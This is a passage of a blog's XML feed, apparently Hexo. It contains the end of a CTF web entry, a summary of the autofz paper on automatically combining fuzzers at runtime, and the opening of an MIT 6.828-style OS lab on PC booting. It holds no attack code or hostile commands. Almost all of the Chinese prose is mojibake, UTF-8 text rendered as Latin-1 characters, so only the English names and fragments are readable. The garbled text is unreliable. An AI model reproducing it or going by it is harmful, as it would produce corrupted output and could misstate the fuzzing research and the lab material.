å³å¯å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>autofz</title>
    <link href="/2024/01/24/autofz/"/>
    <url>/2024/01/24/autofz/</url>
    
    <content type="html"><![CDATA[<h2 id="autofz-Automated-Fuzzer-Composition-at-Runtime"><a href="#autofz-Automated-Fuzzer-Composition-at-Runtime" class="headerlink" title="autofz: Automated Fuzzer Composition at Runtime"></a>autofz: Automated Fuzzer Composition at Runtime</h2><p>ä½œè€…ï¼šYu-Fu Fu &#x2F; Jaehyuk Lee &#x2F; Taesoo Kim</p><p>å­¦æ ¡æˆ–æœºæ„ï¼šGeorgia Institute of Technologyï¼ˆä½æ²»äºšç†å·¥å­¦é™¢ï¼‰</p><h4 id="é€‰æ‹©è´Ÿæ‹…"><a href="#é€‰æ‹©è´Ÿæ‹…" class="headerlink" title="é€‰æ‹©è´Ÿæ‹…"></a>é€‰æ‹©è´Ÿæ‹…</h4><p><strong>ä»€ä¹ˆæ˜¯é€‰æ‹©è´Ÿæ‹…</strong></p><p>æ¨¡ç³Šæµ‹è¯•ç”±äºå¼€å‘å¤šæ ·åŒ–çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·è€Œå˜å¾—è¶Šæ¥è¶Šå—æ¬¢è¿ï¼Œç‰¹åˆ«æ˜¯åœ¨è½¯ä»¶æ¼æ´æ£€æµ‹æ–¹é¢ã€‚ç”±äºå„ç§æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯çš„åº”ç”¨ï¼Œå¤§å¤šæ•°æ¨¡ç³Šæµ‹è¯•å·¥å…·åœ¨å…¶é€‰æ‹©çš„ç›®æ ‡ä¸Šè¡¨ç°å‡ºè‰²ã€‚ç„¶è€Œï¼Œæ¨¡ç³Šæµ‹è¯•å·¥å…·çš„å¤šæ ·æ€§ä¹Ÿä½¿å¾—éš¾ä»¥é€‰æ‹©æœ€é€‚åˆå¤æ‚å®é™…ç¨‹åºçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œç§°ä¹‹ä¸º<strong>é€‰æ‹©è´Ÿæ‹…</strong>ã€‚ç¤¾åŒºå°è¯•é€šè¿‡åˆ›å»ºä¸€ç»„æ ‡å‡†åŸºå‡†æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä»¥æ¯”è¾ƒå’Œå¯¹æ¯”æ¨¡ç³Šæµ‹è¯•å·¥å…·åœ¨å„ç§åº”ç”¨ç¨‹åºä¸Šçš„æ€§èƒ½ï¼Œä½†ç»“æœæ€»æ˜¯ä¸€ä¸ªæ¬¡ä¼˜çš„å†³ç­–â€”â€”å¹³å‡æ€§èƒ½æœ€ä½³çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·å¹¶ä¸ä¿è¯å¯¹ç”¨æˆ·å…³æ³¨çš„ç›®æ ‡äº§ç”Ÿæœ€ä½³ç»“æœã€‚</p><p><strong>å½“å‰è§£å†³ç­–ç•¥</strong></p><ul><li>æ¨¡ç³Šæµ‹è¯•åŸºå‡†Fuzzing benchmarksï¼ˆå¦‚Magmaï¼ŒLavaï¼ŒProFuzzBenchï¼‰åˆ—ä¸¾äº†æ¯ä¸ªåŸºå‡†ç›®æ ‡çš„é€‚ç”¨çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚</li><li>åä½œæ¨¡ç³Šæµ‹è¯•ï¼Œé€šè¿‡åˆä½œä½¿ç”¨ä¸åŒç»„åˆçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œé€šè¿‡å¤šä¸ªæ¨¡ç³Šæµ‹è¯•å™¨çš„è¯­æ–™åº“å…±äº«æå‡æ•´ä½“æ€§èƒ½ã€‚ä½†åœ¨æ¨¡ç³Šæµ‹è¯•å™¨çš„é€‰æ‹©ä¾èµ–äºé™æ€åˆ†æçš„ç»“æœï¼Œä¾ç„¶éœ€è¦å¤§é‡çš„è®¡ç®—å’ŒäººåŠ›èµ„æºï¼ŒåŒæ—¶ï¼Œå¦‚ä½•ä¸ºå¤šä¸ªæ¨¡ç³Šæµ‹è¯•å™¨åˆ†é…åˆç†çš„èµ„æºä¹Ÿä¼šå½±å“æ•´ä½“çš„æ•ˆæœ</li></ul><p><strong>autofzè§£å†³æ€è·¯</strong></p><blockquote><p>Unlike previous works, autofz automatically deploys a set of fuzzer(s) per workload, not per program.</p></blockquote><p>ä¸åƒå…¶ä»–fuzzerï¼Œautofzå¹¶ä¸æ˜¯ä¸ºæ•´ä¸ªç¨‹åºï¼Œè€Œæ˜¯ä¸ºæ¯ä¸ªå·¥ä½œè´Ÿè½½éƒ¨ç½²ä¸€å¥—æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œautofz çš„ç›®æ ‡æ˜¯é€šè¿‡å¯¹æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„åŠ¨æ€ç»„åˆå®ç°é€‰æ‹©é—®é¢˜çš„å®Œå…¨è‡ªåŠ¨åŒ–ï¼Œæˆä¸ºä¸€ç§ä¸€é”®è§£å†³æ–¹æ¡ˆã€‚</p><h4 id="autofz"><a href="#autofz" class="headerlink" title="autofz"></a>autofz</h4><p><strong>trendï¼ˆè¶‹åŠ¿ï¼‰</strong></p><p>å°†åŸºå‡†æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„è¿è¡Œæ—¶è¿›å±•ç§°ä¸ºè¶‹åŠ¿ï¼Œautofzåœ¨æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šéšç€è¶‹åŠ¿çš„å˜åŒ–è€Œåˆ‡æ¢æ¨¡ç³Šæµ‹è¯•å·¥å…·å¹¶è°ƒæ•´èµ„æºï¼Œè€Œä¸æ˜¯åœ¨æ‰§è¡ŒæœŸé—´åšæŒä½¿ç”¨ä¸€ç»„ç‰¹å®šçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚</p><p><strong>å·¥ä½œåŸç†</strong></p><p>å‡†å¤‡é˜¶æ®µï¼š</p><p>æ•è·ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶çš„è¿è¡Œæ—¶è¶‹åŠ¿ï¼Œå¹¶éƒ¨ç½²å±•ç¤ºå¼ºè¶‹åŠ¿çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·</p><p>èšç„¦é˜¶æ®µï¼š</p><p>åŸºäºæ•è·çš„è¶‹åŠ¿å’ŒæŒ‡å¯¼ä¿¡æ¯ï¼Œèšç„¦é˜¶æ®µå°è¯•é€šè¿‡é€‰å®šçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·å®ç°æœ€ä½³æ€§èƒ½ã€‚æ­¤å¤–ï¼Œautofz åˆ©ç”¨æŒ‡å¯¼ä¿¡æ¯çš„åŠ¨æ€èµ„æºè°ƒæ•´ä½¿å…¶èƒ½å¤Ÿå…¼é¡¾ä¸ªä½“æ¨¡ç³Šæµ‹è¯•å·¥å…·å’Œä¸åŒæ¨¡ç³Šæµ‹è¯•å·¥å…·ç»„åˆçš„ä¼˜åŠ¿ã€‚ä¸€æ–¹é¢ï¼Œå®ƒå¯ä»¥ä¼˜å…ˆè€ƒè™‘æŸä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œé€šè¿‡å°†æ‰€æœ‰èµ„æºåˆ†é…ç»™é€‰å®šçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œæ˜¾è‘—ä¼˜äºå…¶ä»–å·¥å…·ã€‚å¦ä¸€æ–¹é¢ï¼Œautofz é€šè¿‡åˆ†é…èµ„æºå……åˆ†åˆ©ç”¨å¤šä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚</p><p><img src="/2024/01/24/autofz/image-20240125102248335.png" alt="image-20240125102248335"></p><ol><li>ä¸ºäº†å…¬å¹³è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ•ˆæœçš„æ¯”è¾ƒï¼Œåœ¨ç¬¬ä¸€æ­¥å…ˆè¿›è¡Œç§å­çš„åŒæ­¥ï¼ŒåŒæ—¶ä¸ºæ‰€æœ‰åŸºå‡†æ¨¡ç³Šæµ‹è¯•å·¥å…·åˆ†é…ç›¸åŒæ•°é‡çš„èµ„æºï¼ˆ1ï¼‰</li><li>ç„¶åæ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨è½®æµä»¥éå¸¸çŸ­çš„æ—¶é—´é—´éš”è¿è¡Œï¼Œç›´åˆ°è¾¾åˆ°é€€å‡ºæ¡ä»¶ï¼ˆé€€å‡ºæ¡ä»¶å°†åœ¨åè¾¹è¯¦ç»†è¯´æ˜ï¼‰ç„¶åé€šè¿‡AFL Bitmapè¡¡é‡æ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨çš„è¿è¡Œæ•ˆæœã€‚ï¼ˆ2ï¼Œ3ï¼‰</li><li>æ ¹æ®è¶‹åŠ¿ï¼Œå†³å®šæ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·åœ¨å½“å‰å·¥ä½œè´Ÿè½½ä¸‹çš„ä¼˜å…ˆçº§ä»¥åŠèµ„æºåˆ†é…å…ƒæ•°æ®ï¼ˆ4ï¼‰</li><li>å¯¹åˆ†é…çš„CPUæ ¸å¿ƒè¿›è¡Œæ—¶é—´åˆ‡ç‰‡ï¼ˆä½œç”¨è¿˜æ²¡æƒ³æ˜ç™½ï¼‰ï¼ˆ5ï¼‰</li><li>è¿‡æ¸¡åˆ°èšç„¦é˜¶æ®µçš„æ—¶å€™åœ¨è¿›è¡Œç§å­åŒæ­¥ï¼ˆ6ï¼Œ7ï¼‰ï¼Œå…è®¸è¢«é€‰æ‹©çš„æ¨¡ç³Šæµ‹è¯•å™¨å…±äº«å‡†å¤‡é˜¶æ®µå¯èƒ½äº§ç”Ÿçš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹</li><li>è¿›å…¥èšç„¦é˜¶æ®µï¼ŒæŒ‰ç…§èµ„æºåˆ†é…å…ƒæ•°æ®ä¸€æ¬¡è¿è¡Œæ‰€é€‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œä¸ºæ¯ä¸ªå·¥å…·åˆ†é…ç‰¹å®šçš„CPUæ—¶é—´çª—å£ï¼ˆ8ï¼‰</li><li>æ­¤æ—¶èšç„¦é˜¶æ®µç›®çš„æ˜¯å®ç°æœ€å¤§æ€§èƒ½ï¼Œæ‰€ä»¥ä¼šåœ¨ä¸€ä¸ªåœ¨ä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·æ‰§è¡Œåï¼Œæˆ‘ä»¬åŒæ­¥ç§å­ï¼Œä»¥å…è®¸å‰©ä½™çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·é€šè¿‡å…¶ä»–æ¨¡ç³Šæµ‹è¯•å·¥å…·æ¢ç´¢æœªå‘ç°çš„è·¯å¾„ã€‚å½“åˆ†é…çš„å…¨éƒ¨èµ„æºè¢«æ¶ˆè€—å®Œæ¯•æ—¶ï¼Œå®ƒå›åˆ°å‡†å¤‡é˜¶æ®µå¹¶æµ‹é‡è¶‹åŠ¿ï¼ˆ9ï¼‰</li><li>ä¸¤ä¸ªé˜¶æ®µè½®æµæ‰§è¡Œï¼ŒçŸ¥é“æ¨¡ç³Šæµ‹è¯•æ‰§è¡Œç»ˆæ­¢</li></ol><h4 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a><strong>éš¾ç‚¹</strong></h4><p><strong>å‡†å¤‡æ—¶é—´</strong></p><p>å‡†å¤‡é˜¶æ®µçš„æ—¶é—´é€‰æ‹©è‡³å…³é‡è¦ï¼Œå¦‚æœå‡†å¤‡é˜¶æ®µçš„æ—¶é—´è¿‡çŸ­ï¼Œå¾ˆéš¾æ•è·åˆ°æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„æ˜æ˜¾è¶‹åŠ¿ï¼Œå¯¼è‡´æœ€åé€‰å–çš„å·¥å…·é›†å¹¶ä¸æ˜¯æœ€ä¼˜çš„ï¼›ä½†å‡†å¤‡æ—¶é—´è¿‡é•¿ï¼Œåˆ™æœ‰å¯èƒ½é€ æˆèµ„æºçš„æµªè´¹ï¼ŒåŒæ—¶ä½¿æ•´ä¸ªå®éªŒçš„å‘¨æœŸå»¶é•¿ã€‚ä¸ºäº†é¿å…å¼•å…¥å¦ä¸€ç§æ‰‹åŠ¨ç¡®å®šé€‚å½“æ—¶é—´é¢„ç®—çš„æ–¹æ³•ï¼Œautofzå¼•å…¥äº†åŠ¨æ€å‡†å¤‡æ—¶é—´ã€‚</p><p>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œautofzé¦–å…ˆåœ¨è¿è¡Œæ—¶è®¡ç®—ä½å›¾çš„å³°å€¼å·®å¼‚ï¼Œå½“å·®å¼‚å¤§äºå®šä¹‰çš„é˜ˆå€¼æ—¶ï¼Œå¯ä»¥å…è®¸å‡†å¤‡é˜¶æ®µæå‰é€€å‡ºï¼Œç„¶åç›´æ¥è¿›å…¥èšç„¦é˜¶æ®µï¼Œå¤šä½™çš„èµ„æºåŒæ ·ä¹Ÿè¢«å§”æ‰˜ç»™èšç„¦é˜¶æ®µã€‚é˜ˆå€¼å¯ä»¥ç”±ç”¨æˆ·è¿›è¡Œåˆå§‹é…ç½®ï¼ˆÎ¸initï¼‰ã€‚ç„¶è€Œï¼Œautofzä¼šè‡ªåŠ¨è°ƒæ•´åˆå§‹é…ç½®å¹¶æ‰¾åˆ°æ¯ä¸ªç›®æ ‡çš„æœ€ä½³é˜ˆå€¼ï¼Œä»è€Œæ¶ˆé™¤äº†å¦ä¸€ç§æ‰‹åŠ¨åŠªåŠ›ã€‚é˜ˆå€¼ä¼šåœ¨æ¯ä¸ªå‡†å¤‡é˜¶æ®µä¹‹åçš„æ¯ä¸€è½®è¿›è¡Œæ ¡å‡†ã€‚å…·ä½“è€Œè¨€ï¼Œå¦‚æœå‘ç”Ÿæå‰é€€å‡ºï¼Œautofzå°†é€šè¿‡Î¸initå¢åŠ é˜ˆå€¼ï¼ˆÎ¸curï¼‰ã€‚å¦åˆ™ï¼Œå®ƒå°†Î¸curé™¤ä»¥äºŒã€‚è¿™ç§è®¾è®¡èƒŒåçš„åŸç†æ˜¯éšç€æ¨¡ç³Šæµ‹è¯•æ´»åŠ¨çš„è¿›è¡Œï¼Œæ€»ä½“ä¸Šå…¶è¿›å±•é€æ¸å‡ç¼“ã€‚åœ¨å…¶æ—©æœŸé˜¶æ®µï¼Œç”±äºä»¥åˆæ³•ç§å­ä½œä¸ºå…¶åˆå§‹è¾“å…¥ï¼Œæ‰€é€‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·é€šå¸¸ä¼šäº§ç”Ÿç›¸å½“å¤§çš„è¿›å±•ã€‚å› æ­¤ï¼Œå¦‚æœé˜ˆå€¼è¿‡å°ï¼Œå®ƒå°†å¾ˆå®¹æ˜“è¢«è¶Šè¿‡ï¼Œautofzå¯èƒ½ä¼šåšå‡ºæ¬¡ä¼˜çš„å†³ç­–ã€‚ç›¸åï¼Œéšç€æ¨¡ç³Šæµ‹è¯•æ´»åŠ¨çš„è¿›è¡Œï¼Œæ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·äº§ç”Ÿçš„è¿›å±•å¾ˆå®¹æ˜“é¥±å’Œï¼Œæ¢ç´¢æ–°è·¯å¾„å˜å¾—å›°éš¾ã€‚</p><p><strong>å¦‚ä½•è¡¡é‡è¶‹åŠ¿</strong></p><p>ç”±äºè¿›è¡Œäº†ç§å­çš„åŒæ­¥ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥å°†è¿è¡Œæ—¶ï¼Œæ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·èƒ½æ¢ç´¢çš„ç‹¬ç‰¹çš„è·¯å¾„è§†ä½œå…¶è´¡çŒ®ï¼Œå³æ‰¾åˆ°æ‰€æœ‰å·¥å…·çš„å…±åŒè·¯å¾„ï¼Œç„¶åæŠŠè¿™äº›è·¯å¾„ä»ä½å›¾ä¸­å‡æ‰ï¼Œæ¯”è¾ƒè´¡çŒ®å¤§å°</p><p><strong>èµ„æºåˆ†é…</strong></p><p>autofzæ”¯æŒä¸¤ç§èµ„æºåˆ†é…ç­–ç•¥</p><ol><li>ä¼˜å…ˆè€ƒè™‘æœ€ä½³æ€§èƒ½ï¼Œå°†æ‰€æœ‰èµ„æºåˆ†é…ç»™æ’åæœ€é«˜çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚ä»…å½“æŸä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·æ˜æ˜¾ä¼˜äºæ‰€æœ‰å…¶ä»–åŸºå‡†æ¨¡ç³Šæµ‹è¯•å·¥å…·æ—¶ï¼Œæ‰æ¿€æ´»æ­¤ç­–ç•¥</li><li>æ ¹æ®æ¯ä¸ªæ¨¡ç³Šæµ‹è¯•å·¥å…·çš„è¶‹åŠ¿è¿›è¡Œæ¯”ä¾‹åˆ†é…èµ„æºã€‚è¯·æ³¨æ„ï¼Œæ¯ä¸ªåŸºå‡†æ¨¡ç³Šæµ‹è¯•å·¥å…·çš„è´¡çŒ®æ˜¯åŸºäºå®ƒå‘ç°çš„å”¯ä¸€è·¯å¾„è¿›è¡Œè¯„ä¼°çš„ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨å‡†å¤‡é˜¶æ®µæ•è·åˆ°å¤šä¸ªå¼ºçƒˆè¶‹åŠ¿ï¼Œè¿™å¾ˆå¤§ç¨‹åº¦ä¸Šè¡¨æ˜å‡†å¤‡é˜¶æ®µæ‰¾åˆ°äº†å¤šä¸ªæœ‰åˆ©äºæ¨¡ç³Šæµ‹è¯•ç¨‹åºä¸åŒéƒ¨åˆ†çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ ¹æ®å®ƒä»¬çš„è´¡çŒ®æ¯”ä¾‹åˆ†é…èµ„æºï¼Œå¹¶å®ç°åä½œæ¨¡ç³Šæµ‹è¯•çš„å¥½å¤„ã€‚</li></ol><h4 id="å®éªŒå®æ–½"><a href="#å®éªŒå®æ–½" class="headerlink" title="å®éªŒå®æ–½"></a><strong>å®éªŒå®æ–½</strong></h4><p><strong>å®éªŒç¯å¢ƒ</strong></p><p>åœ¨é…å¤‡ AMD Ryzen 9 3900 çš„ Ubuntu 20.04 ä¸Šè¿›è¡Œå®éªŒï¼Œå†…å­˜ä¸º 24 ä¸ªï¼Œå†…å­˜ä¸º 32 GBã€‚ä¸ºäº†å°†autofzä¸CUPIDå’ŒENFUZZè¿›è¡Œæ¯”è¾ƒï¼Œå°†å¤šä¸ªCPUå†…æ ¸åˆ†é…ç»™Dockerå®¹å™¨ã€‚å°† autofz ä¸å•ä¸ª fuzzer è¿›è¡Œæ¯”è¾ƒçš„å…¶ä»–è¯„ä¼°æ˜¯ä½¿ç”¨å®¹å™¨æ‰§è¡Œçš„ï¼Œå®¹å™¨åˆ†é…ä¸€ä¸ª CPU å†…æ ¸ï¼Œè€Œä¸ä¼šé™åˆ¶å†…å­˜ã€‚ç”±äºå…¼å®¹æ€§ï¼Œæ‰€æœ‰å®¹å™¨è¿è¡Œ Ubuntu 16.042ã€‚</p><p><strong>åŸºå‡†æ¨¡ç³Šå™¨é€‰æ‹©</strong></p><p>autofz ä½¿ç”¨äº†æ‰€æœ‰æ”¯æŒ Fuzzer Test Suite å’Œ UNIFUZZ çš„æ¨¡ç³Šæµ‹è¯•å™¨ï¼ŒåŒæ—¶æ”¯æŒCUPIDå’ŒENFUZZä¸­é‡‡ç”¨çš„æ‰€æœ‰æ¨¡ç³Šæµ‹è¯•å™¨è¿›è¡Œå…¬å¹³æ¯”è¾ƒ</p><blockquote><p><strong>Fuzzer Test Suiteï¼ˆFTSï¼‰</strong>ï¼š</p><p>Fuzzer Test Suite åŒ…æ‹¬ä¸€ç³»åˆ—æ ‡å‡†åŒ–çš„æµ‹è¯•ç”¨ä¾‹å’Œç›®æ ‡ç¨‹åºï¼Œç”¨äºæ¨¡ç³Šæµ‹è¯•å·¥å…·çš„æ€§èƒ½è¯„ä¼°ã€‚è¿™äº›æµ‹è¯•ç”¨ä¾‹å¯èƒ½æ¶‰åŠä¸åŒç±»å‹çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œåº”ç”¨ç¨‹åºï¼Œæ—¨åœ¨è¦†ç›–å¤šä¸ªåº”ç”¨åœºæ™¯ã€‚FTS çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªä¸€è‡´çš„åŸºå‡†ï¼Œä»¥ä¾¿ç ”ç©¶äººå‘˜å’Œå¼€å‘äººå‘˜èƒ½å¤Ÿæœ‰æ•ˆåœ°è¯„ä¼°ä¸åŒæ¨¡ç³Šæµ‹è¯•å·¥å…·çš„è¡¨ç°ã€‚</p><p><strong>UNIFUZZ</strong>ï¼š</p><p>UNIFUZZ æ˜¯ä¸€ä¸ªå¼€æºçš„ã€é›†æˆåŒ–çš„æ¨¡ç³Šæµ‹è¯•è§£å†³æ–¹æ¡ˆï¼Œä¸“æ³¨äºæä¾›å¯æ‰©å±•å’Œæ˜“ç”¨çš„æ¨¡ç³Šæµ‹è¯•ç¯å¢ƒã€‚å®ƒä¸ºç ”ç©¶äººå‘˜å’Œå¼€å‘äººå‘˜æä¾›äº†ä¸€æ•´å¥—å·¥å…·ï¼ŒåŒ…æ‹¬å„ç§å…ˆè¿›çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€èµ„æºç®¡ç†ã€ç»“æœåˆ†æç­‰åŠŸèƒ½ã€‚</p><p><strong>CUPIDï¼š</strong></p><p>CUPID æ˜¯ä¸€ä¸ªååŒæ¨¡ç³Šæµ‹è¯•å¹³å°ï¼Œæ—¨åœ¨é€šè¿‡ååŒä¸åŒç±»å‹çš„æ¨¡ç³Šå™¨ä»¥æé«˜æ¨¡ç³Šæµ‹è¯•æ´»åŠ¨çš„æ€§èƒ½ã€‚å®ƒé€šè¿‡ç§å­åŒæ­¥ç­‰æ–¹æ³•ï¼ŒååŒè¿è¡Œå¤šä¸ªæ¨¡ç³Šå™¨ï¼Œä»¥æœŸè·å¾—æ›´å¥½çš„ä»£ç è¦†ç›–ç‡å’Œæ›´é«˜çš„æ¼æ´å‘ç°ç‡ã€‚</p><p><strong>ENFUZZï¼š</strong></p><p>ENFUZZ æ˜¯ä¸€ä¸ªæ¼”åŒ–ç¥ç»æ¨¡ç³Šç³»ç»Ÿï¼Œä¸“æ³¨äºæ— ç›‘ç£åŒºåŸŸå®Œæˆã€‚å®ƒç»“åˆäº†æ¼”åŒ–ç®—æ³•å’Œç¥ç»æ¨¡ç³Šç³»ç»Ÿçš„æ€æƒ³ï¼Œé€šè¿‡è¿›åŒ–çš„æ–¹å¼æ”¹è¿›æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼Œæé«˜æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡å’Œæ•ˆæœã€‚</p></blockquote><p><strong>ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶å’Œç§å­</strong></p><p>å°†autofzé›†æˆåˆ°äº†UNIFUZZå’ŒFTSä¸­ï¼Œä½¿ç”¨çœŸå®çš„ç¨‹åºè¯„ä¼°autofz</p><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p><img src="/2024/01/24/autofz/image-20240126215138099.png" alt="image-20240126215138099"></p><p>æ¨ªåæ ‡æ˜¯è¿è¡Œæ—¶é—´ï¼Œçºµåæ ‡æ˜¯ä½å›¾è¦†ç›–ç‡</p><p>å¯ä»¥çœ‹å‡ºï¼Œautofzçš„æ•ˆæœåŸºæœ¬éƒ½ä¼˜äºå•ä¸ªæ¨¡ç³Šæµ‹è¯•å™¨ï¼Œä¸”éšç€è¿è¡Œæ—¶é—´æ¨ç§»ï¼Œæ•ˆæœä¼šè¶Šæ¥è¶Šå¥½ã€‚åªåœ¨pdftotextè¿™é‡Œè¾“ç»™äº†RedQueen</p><p><img src="/2024/01/24/autofz/image-20240126220213062.png" alt="image-20240126220213062"></p><p>æœ¬æ–‡å¼•å…¥äº†CDå›¾ï¼ˆï¼‰UNIFUZZ ä¸­ç›®æ ‡çš„å…³é”®å·®å¼‚ã€‚æ¯ä¸ªæ•°å­—è¡¨ç¤ºæ¨¡ç³Šå™¨çš„å¹³å‡æ’åã€‚æ¯ä¸ªç²—ä½“çº¿è¡¨ç¤ºæ ¹æ® æŒ‰è¯¥è¡Œåˆ†ç»„çš„æ¨¡ç³Šå™¨ä¹‹é—´çš„æ€§èƒ½å·®å¼‚æ²¡æœ‰ç»Ÿè®¡å­¦æ„ä¹‰ã€‚è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œå¹³å‡è€Œè¨€ï¼ŒUNIFUZZ å’Œ FTS ä¸­çš„ autofz æ’ååˆ†åˆ«ä¸º 1.22 å’Œ 1.2ï¼Œæ€§èƒ½ä¼˜äºåˆ«çš„å•ä¸ªæ¨¡ç³Šå™¨</p><p><img src="/2024/01/24/autofz/image-20240126222155028.png" alt="image-20240126222155028"></p><p>ä¸åˆ«çš„æ¨¡ç³Šå™¨åä½œæ–¹æ³•æ¯”è¾ƒï¼Œæ¨ªåæ ‡æ˜¯CPUæ—¶é—´</p><p>autofz-6 &#x3D; [AFL, FairFuzz, QSYM, AFLFast, LAF-INTEL, Radamsa]</p><p>CUPID-4 and ENFUZZ-Q &#x3D; [AFL, FairFuzz, QSYM, AFLFast]</p><p>autofz-10 &#x3D; [All baseline fuzzers described in except libFuzzer]</p><p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨é¢å¯¹ä¸åŒçš„æ¨¡ç³Šå™¨é€‰æ‹©ç­–ç•¥æ—¶ï¼ˆä½†ç»„åˆå›ºå®šï¼‰æ—¶ï¼Œautofzæ‰€æä¾›çš„è‡ªåŠ¨é€‰æ‹©æœ€ä½³æ€§èƒ½æ¨¡ç³Šæµ‹è¯•å™¨çš„æ–¹æ³•æœ‰æ˜¾è‘—çš„æ•ˆæœ</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSlab1</title>
    <link href="/2023/11/29/OSlab1/"/>
    <url>/2023/11/29/OSlab1/</url>
    
    <content type="html"><![CDATA[<h2 id="OS-lab1-Booting-a-PC"><a href="#OS-lab1-Booting-a-PC" class="headerlink" title="OS  - lab1 Booting a PC"></a>OS  - lab1 Booting a PC</h2><h3 id="å®éªŒç›®çš„ï¼š"><a href="#å®éªŒç›®çš„ï¼š" class="headerlink" title="å®éªŒç›®çš„ï¼š"></a><strong>å®éªŒç›®çš„ï¼š</strong></h3><ul><li>ç†Ÿæ‚‰QEMUï¼Œäº†è§£PCå¼€æœºç¨‹åº</li><li>æ¢ç©¶6.828çš„å†…æ ¸åŠ è½½è¿‡ç¨‹ï¼Œäº†è§£å¼€æœºåï¼Œå†…æ ¸æ˜¯å¦‚ä½•åŠ è½½åˆ°å†…å­˜å¹¶è¿è¡Œçš„</li><li>æ¢ç©¶6.828å†…æ ¸çš„åŸºæœ¬ç»“æ„</li></ul><h3 id="ç¬¬ä¸€éƒ¨åˆ†ï¼šPC-Bootstrap"><a href="#ç¬¬ä¸€éƒ¨åˆ†ï¼šPC-Bootstrap" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†ï¼šPC Bootstrap"></a>ç¬¬ä¸€éƒ¨åˆ†ï¼šPC Bootstrap</h3><p><img src="/2023/11/29/OSlab1/image-20231130154817983.png" alt="image-20231130154817983"></p><p>ç¬¬ä¸€ä»£PCå¤„ç†å™¨æ˜¯16ä½å­—é•¿çš„Intel 8088å¤„ç†å™¨ï¼Œä½†å…¶åœ°å€æ€»çº¿æœ‰20ä½ï¼Œæ‰€ä»¥èƒ½å¤Ÿå®ç°1MBçš„å¯»å€ï¼ˆ<strong>æ®µå¯„å­˜å™¨ä¸­çš„å€¼å·¦ç§»4ä½ï¼Œå½¢æˆ20ä½æ®µåŸºå€ï¼Œç„¶åå’Œ16ä½æ®µå†…åç§»ç›¸åŠ </strong>ï¼‰ï¼Œå³0x00000000 - 0x000FFFFFï¼Œä½†ä¹Ÿåªæœ‰640KBæ˜¯ç”¨æˆ·å¯ç”¨çš„ï¼Œå‰©ä¸‹çš„ç©ºé—´ç”¨ä½œå…¶ä»–ç›®çš„ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚å…¶ä¸­æœ€é‡è¦çš„æ˜¯BIOS ROMï¼ŒBIOSè´Ÿè´£è¿›è¡Œä¸€äº›åŸºæœ¬çš„ç³»ç»Ÿåˆå§‹åŒ–ä»»åŠ¡ï¼Œæ¯”å¦‚å¼€å¯æ˜¾å¡ï¼Œæ£€æŸ¥ç³»ç»Ÿçš„å†…å­˜å¤§å°ç­‰å·¥ä½œã€‚åœ¨åˆå§‹åŒ–å®Œæˆä¹‹åï¼Œä»åˆé€‚çš„åœ°æ–¹åŠ è½½æ“ä½œç³»ç»Ÿã€‚</p><p>è™½ç„¶Intelå¤„ç†å™¨çªç 